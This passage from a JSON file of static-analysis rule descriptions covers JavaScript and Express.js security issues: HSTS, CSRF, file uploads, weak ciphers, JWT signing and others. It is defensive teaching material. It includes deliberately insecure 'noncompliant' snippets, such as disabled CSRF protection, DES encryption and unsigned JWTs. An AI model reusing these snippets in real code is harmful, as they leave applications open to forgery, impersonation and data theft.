        "htmlDesc": "<p>When implementing the HTTPS protocol, the website mostly continue to support the HTTP protocol to redirect users to HTTPS when they request a HTTP\nversion of the website. These redirects are not encrypted and are therefore vulnerable to man in the middle attacks. The <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security\">Strict-Transport-Security policy header</a> (HSTS) set by\nan application instructs the web browser to convert any HTTP request to HTTPS.</p>\n<p>Web browsers that see the Strict-Transport-Security policy header for the first time record information specified in the header:</p>\n<ul>\n  <li> the <code>max-age</code> directive which specify how long the policy should be kept on the web browser. </li>\n  <li> the <code>includeSubDomains</code> optional directive which specify if the policy should apply on all sub-domains or not. </li>\n  <li> the <code>preload</code> optional directive which is not part of the HSTS specification but supported on all modern web browsers. </li>\n</ul>\n<p>With the <code>preload</code> directive the web browser never connects in HTTP to the website and to use this directive, it is required <a\nhref=\"https://hstspreload.org/\">to submit</a> the concerned application to a preload service maintained by Google.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The website is accessible with the unencrypted HTTP protocol. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement Strict-Transport-Security policy header, it is recommended to apply this policy to all subdomains (<code>includeSubDomains</code>) and\nfor at least 6 months (<code>max-age=15552000</code>) or even better for 1 year (<code>max-age=31536000</code>).</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> or <a\nhref=\"https://www.npmjs.com/package/hsts\">hsts</a> middleware are disabled or used without recommended values:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(helmet.hsts({\n  maxAge: 3153600, // Sensitive, recommended &gt;= 15552000\n  includeSubDomains: false // Sensitive, recommended 'true'\n}));\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a standard way to implement HSTS is with the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> or <a\nhref=\"https://www.npmjs.com/package/hsts\">hsts</a> middleware:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(helmet.hsts({\n  maxAge: 31536000,\n  includeSubDomains: true\n})); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security\">developer.mozilla.org</a> - Strict Transport\n  Security </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5743": {
        "name": "Allowing browsers to perform DNS prefetching is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>By default, web browsers perform <a href=\"https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch/\">DNS prefetching</a> to reduce\nlatency due to DNS resolutions required when an user clicks links from a website page.</p>\n<p>For instance on example.com the hyperlink below contains a cross-origin domain name that must be resolved to an IP address by the web browser:</p>\n<pre>\n&lt;a href=\"https://otherexample.com\"&gt;go on our partner website&lt;/a&gt;\n</pre>\n<p>It can add significant latency during requests, especially if the page contains many links to cross-origin domains. DNS prefetch allows web\nbrowsers to perform DNS resolving in the background before the user clicks a link. This feature can cause privacy issues because DNS resolving from\nthe user’s computer is performed without his consent if he doesn’t intent to go to the linked website.</p>\n<p>On a complex private webpage, a combination \"of unique links/DNS resolutions\" can indicate, to a eavesdropper for instance, that the user is\nvisiting the private page.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Links to cross-origin domains could result in leakage of confidential information about the user’s navigation/behavior of the website. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control\">X-DNS-Prefetch-Control</a> header with an\n<em>off</em> value but this could significantly degrade website performances.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/dns-prefetch-control\">dns-prefetch-control</a>\nmiddleware is disabled or used without the recommended value:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.dnsPrefetchControl({\n    allow: true // Sensitive: allowing DNS prefetching is security-sensitive\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application the <a href=\"https://www.npmjs.com/package/dns-prefetch-control\">dns-prefetch-control</a> or <a\nhref=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware is the standard way to implement <code>X-DNS-Prefetch-Control</code> header:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.dnsPrefetchControl({\n    allow: false // Compliant\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control\">developer.mozilla.org</a> - X-DNS-Prefetch-Control\n  </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch\">developer.mozilla.org</a> - Using dns-prefetch </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S2598": {
        "name": "File uploads should be restricted",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>If the file upload feature is implemented without proper folder restriction, it will result in an implicit trust violation within the server, as\ntrusted files will be implicitly stored alongside third-party files that should be considered untrusted.</p>\n<p>This can allow an attacker to disrupt the security of an internal server process or the running application.</p>\n<h3>What is the potential impact?</h3>\n<p>After discovering this vulnerability, attackers may attempt to upload as many different file types as possible, such as javascript files, bash\nscripts, malware, or malicious configuration files targeting potential processes.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in uploading a file recognized by in an internal tool, triggering code execution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<h4>Server Resource Exhaustion</h4>\n<p>By repeatedly uploading large files, an attacker can consume excessive server resources, resulting in a denial of service.</p>\n<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service can only affect the attacker who caused it.</p>\n<p>Even though a denial of service might have little direct impact, it can have secondary impact in architectures that use containers and container\norchestrators. For example, it can cause unexpected container failures or overuse of resources.</p>\n<p>In some cases, it is also possible to force the product to \"fail open\" when resources are exhausted, which means that some security features are\ndisabled in an emergency.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Formidable</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst Formidable = require('formidable');\n\nconst form          = new Formidable(); // Noncompliant\nform.uploadDir      = \"/tmp/\";\nform.keepExtensions = true;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst Formidable = require('formidable');\n\nconst form          = new Formidable();\nform.uploadDir      = \"/uploads/\";\nform.keepExtensions = false;\n</pre>\n<h3>How does this work?</h3>\n<h4>Use pre-approved folders</h4>\n<p>Create a special folder where untrusted data should be stored. This folder should be classified as untrusted and have the following\ncharacteristics:</p>\n<ul>\n  <li> It should have specific read and write permissions that belong to the right people or organizations. </li>\n  <li> It should have a size limit or its size should be monitored. </li>\n  <li> It should contain backup copies if it contains data that belongs to users. </li>\n</ul>\n<p>This folder should not be located in <code>/tmp</code>, <code>/var/tmp</code> or in the Windows directory <code>%TEMP%</code>.<br> These folders\nare usually \"world-writable\", can be manipulated, and can be accidentally deleted by the system.</p>\n<p>Also, the original file names and extensions should be changed to controlled strings to prevent unwanted code from being executed based on the file\nnames.</p>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/434\">CWE-434 - Unrestricted Upload of File with Dangerous Type</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload\">OWASP Unrestricted File Upload</a> - Unrestricted File\n  Upload </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S4502": {
        "name": "Disabling CSRF protections is security-sensitive",
        "htmlDesc": "<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive\nactions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the\napplication.</p>\n<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a\nhidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul>  </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> protection is not found on an unsafe HTTP method like POST\nmethod:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\nlet csrfProtection = csrf({ cookie: true });\n\nlet app = express();\n\n// Sensitive: this operation doesn't look like protected by CSURF middleware (csrfProtection is not used)\napp.post('/money_transfer', parseForm, function (req, res) {\n  res.send('Money transferred');\n});\n</pre>\n<p>Protection provided by <a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> is globally disabled on unsafe methods:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\napp.use(csrf({ cookie: true, ignoreMethods: [\"POST\", \"GET\"] })); // Sensitive as POST is unsafe method\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> protection is used on unsafe methods:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\nlet csrfProtection = csrf({ cookie:  true });\n\nlet app = express();\n\napp.post('/money_transfer', parseForm, csrfProtection, function (req, res) { // Compliant\n  res.send('Money transferred')\n});\n</pre>\n<p>Protection provided by <a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> is enabled on unsafe methods:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\napp.use(csrf({ cookie: true, ignoreMethods: [\"GET\"] })); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5742": {
        "name": "Disabling Certificate Transparency monitoring is security-sensitive",
        "htmlDesc": "<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency\">Certificate Transparency</a> (CT) is an open-framework to\nprotect against identity theft when certificates are issued. <a href=\"https://en.wikipedia.org/wiki/Certificate_authority\">Certificate Authorities</a>\n(CA) electronically sign certificate after verifying the identify of the certificate owner. Attackers use, among other things, social engineering\nattacks to trick a CA to correctly verifying a spoofed identity/forged certificate.</p>\n<p>CAs implement Certificate Transparency framework to publicly log the records of newly issued certificates, allowing the public and in particular\nthe identity owner to monitor these logs to verify that his identify was not usurped.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The website identity is valuable and well-known, therefore prone to theft. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT\">Expect-CT</a> HTTP header which instructs the web browser\nto check <a href=\"https://www.certificate-transparency.org/known-logs\">public CT logs</a> in order to verify if the website appears inside and if it\nis not, the browser will block the request and display a warning to the user.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/expect-ct\">expect-ct</a> middleware is disabled:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n    helmet({\n      expectCt: false // Sensitive\n    })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application the <a href=\"https://www.npmjs.com/package/expect-ct\">expect-ct</a> middleware is the standard way to implement\nexpect-ct. Usually, the deployment of this policy starts with the report only mode (<code>enforce: false</code>) and with a low <code>maxAge</code>\n(the number of seconds the policy will apply) value and next if everything works well it is recommended to block future connections that violate\nExpect-CT policy (<code>enforce: true</code>) and greater value for maxAge directive:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(helmet.expectCt({\n  enforce: true,\n  maxAge: 86400\n})); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency\">developer.mozilla.org</a> - Certificate Transparency\n  </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Certificate_authority\">wikipedia.org</a> - Certificate Authority </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/errorhandler\">errorhandler Express.js middleware</a> should not be used in production:</p>\n<pre>\nconst express = require('express');\nconst errorhandler = require('errorhandler');\n\nlet app = express();\napp.use(errorhandler()); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/errorhandler\">errorhandler Express.js middleware</a> used only in development mode:</p>\n<pre>\nconst express = require('express');\nconst errorhandler = require('errorhandler');\n\nlet app = express();\n\nif (process.env.NODE_ENV === 'development') {\n  app.use(errorhandler());\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5604": {
        "name": "Using intrusive permissions is security-sensitive",
        "htmlDesc": "<p><a href=\"https://www.w3.org/TR/permissions/#powerful-feature\">Powerful features</a> are browser features (geolocation, camera, microphone …​) that\ncan be accessed with JavaScript API and may require a permission granted by the user. These features can have a high impact on privacy and user\nsecurity thus they should only be used if they are really necessary to implement the critical parts of an application.</p>\n<p>This rule highlights intrusive permissions when requested with <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Permissions/query\">the\nfuture standard (but currently experimental) web browser query API</a> and specific APIs related to the permission. It is highly recommended to\ncustomize this rule with the permissions considered as intrusive in the context of the web application.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some powerful features used by the application are not really necessary. </li>\n  <li> Users are not clearly informed why and when powerful features are used by the application. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> In order to respect user privacy it is recommended to avoid using intrusive powerful features. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>When using <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API\">geolocation API</a>, Firefox for example retrieves personal\ninformation like nearby wireless access points and IP address and sends it to the default geolocation service provider, <a\nhref=\"https://www.google.com/privacy/lsf.html\">Google Location Services</a>:</p>\n<pre>\nnavigator.permissions.query({name:\"geolocation\"}).then(function(result) {\n});  // Sensitive: geolocation is a powerful feature with high privacy concerns\n\nnavigator.geolocation.getCurrentPosition(function(position) {\n  console.log(\"coordinates x=\"+position.coords.latitude+\" and y=\"+position.coords.longitude);\n}); // Sensitive: geolocation is a powerful feature with high privacy concerns\n</pre>\n<h2>Compliant Solution</h2>\n<p>If geolocation is required, always explain to the user why the application needs it and prefer requesting an approximate location when\npossible:</p>\n<pre>\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;\n        Retailer website example\n    &lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    Type a city, street or zip code where you want to retrieve the closest retail locations of our products:\n    &lt;form method=post&gt;\n        &lt;input type=text value=\"New York\"&gt; &lt;!-- Compliant --&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Web Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/250\">CWE-250 - Execution with Unnecessary Privileges</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/359\">CWE-359 - Exposure of Private Information</a> </li>\n  <li> <a href=\"https://www.w3.org/TR/permissions/\">W3C</a> - Permissions </li>\n  <li> <a href=\"https://support.mozilla.org/en-US/kb/does-firefox-share-my-location-websites\">Mozilla</a> - Does Firefox share my location with\n  websites? </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S5725": {
        "name": "Using remote artifacts without integrity checks is security-sensitive",
        "htmlDesc": "<p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>\n<p>On the client side, where front-end code is executed, malicious code could:</p>\n<ul>\n  <li> impersonate users' identities and take advantage of their privileges on the application. </li>\n  <li> add quiet malware that monitors users' session and capture sensitive secrets. </li>\n  <li> gain access to sensitive clients' personal data. </li>\n  <li> deface, or otherwise affect the general availability of the application. </li>\n  <li> mine cryptocurrencies in the background. </li>\n</ul>\n<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For\nexample, server-side malware could:</p>\n<ul>\n  <li> access and modify sensitive technical and business data. </li>\n  <li> elevate its privileges on the underlying operating system. </li>\n  <li> Use the compromised application as a pivot to attack the local network. </li>\n</ul>\n<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes\napplied to it before it is downloaded.<br> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication\nwebsite or that was legitimately changed by its author, in a more benign scenario.</p>\n<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and\nintegrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The artifact is a file intended to execute code. </li>\n  <li> The artifact is a file that is intended to configure or affect running code in some way. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified\nsince the fingerprint was computed.</p>\n<p>In this case, the artifact’s hash must:</p>\n<ul>\n  <li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li>\n  <li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li>\n</ul>\n<p>To do so, the best option is to add the hash in the code explicitly, by following <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes\">Mozilla’s official documentation on\nhow to generate integrity strings</a>.</p>\n<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named \"latest\" or similar, so that the\nfront-end pages do not break when the code of the latest remote artifact changes.</strong></p>\n<h2>Sensitive Code Example</h2>\n<p>The following code sample uses neither integrity checks nor version pinning:</p>\n<pre>\nlet script = document.createElement(\"script\");\nscript.src = \"https://cdn.example.com/latest/script.js\"; // Sensitive\nscript.crossOrigin = \"anonymous\";\ndocument.head.appendChild(script);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlet script = document.createElement(\"script\");\nscript.src = \"https://cdn.example.com/v5.3.6/script.js\";\nscript.integrity = \"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\";\nscript.crossOrigin = \"anonymous\";\ndocument.head.appendChild(script);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/353\">CWE-353 - Missing Support for Integrity Check</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\">developer.mozilla.org</a> - Subresource Integrity </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Watering_hole_attack\">Wikipedia, Watering Hole Attacks</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"DES\", key, iv); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"AES-256-GCM\", key, iv);\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5659": {
        "name": "JWT should be signed and verified with strong cipher algorithms",
        "htmlDesc": "<p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>\n<h2>Why is this an issue?</h2>\n<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security\nrisk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This\nvulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT\nhinges on the strength and presence of its signature.</p>\n<h3>What is the potential impact?</h3>\n<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant\nthreat to data security and the privacy of user identities.</p>\n<h4>Impersonation of users</h4>\n<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.\nWhen these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to\ncraft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level\npermissions and sensitive data.</p>\n<h4>Unauthorized data access</h4>\n<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker\ncan manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>\n<h2>How to fix it in jsonwebtoken</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.sign(payload, key, { algorithm: 'none' }); // Noncompliant\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.verify(token, key, {\n    expiresIn: 360000,\n    algorithms: ['none'] // Noncompliant\n}, callbackcheck);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.sign(payload, key, { algorithm: 'HS256' });\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.verify(token, key, {\n    expiresIn: 360000,\n    algorithms: ['HS256']\n}, 